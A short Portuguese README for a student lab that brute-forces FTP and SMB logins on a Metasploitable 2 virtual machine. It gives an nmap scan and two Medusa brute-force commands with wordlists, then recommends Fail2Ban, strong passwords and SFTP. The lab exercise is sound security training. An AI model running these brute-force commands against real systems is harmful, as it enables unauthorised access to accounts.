# 🛡️ Cybersecurity Lab: Exploração de Força Bruta

## 📝 Introdução
Este projeto demonstra a prática de ataques de força bruta em um laboratório controlado (Metasploitable 2), focando na exploração e posterior mitigação de vulnerabilidades nos protocolos FTP e SMB.

## 🚀 Desafios e Superação Técnica
Durante a execução, foquei na eficiência e resolução de problemas:
*   **Gestão de Recursos:** Configurei as VMs com RAM reduzida (256MB para o alvo) para evitar travamentos no hardware.
*   **Manipulação de Wordlists:** Superei limitações de layout de teclado utilizando comandos diretos (`echo -e`) e colagem técnica de sintaxe. Isso garantiu que as wordlists tivessem a formatação exata exigida pelo Medusa.
*   **Fixação de Conhecimento:** Pratiquei a criação de arquivos via terminal para entender o fluxo de dados entre o utilizador e o sistema operacional.

## 🔍 Execução do Projeto

### 1. Reconhecimento (Nmap)
Identificação de portas abertas:
`nmap -sV [IP]`
*(Inserir imagem: nmap_result.png)*

### 2. Ataque FTP (Medusa)
`medusa -h [IP] -U users.txt -P passwords.txt -M ftp`
> ![Sucesso FTP](sucesso_ftp.png)

### 3. Ataque SMB
`medusa -h [IP] -U users.txt -P passwords.txt -M smbnt`
> ![Sucesso SMB](sucesso_smb.png)

## 🛡️ Mitigação
Como prevenção, recomendo o uso de **Fail2Ban**, políticas de senhas fortes e a substituição do FTP pelo **SFTP**.
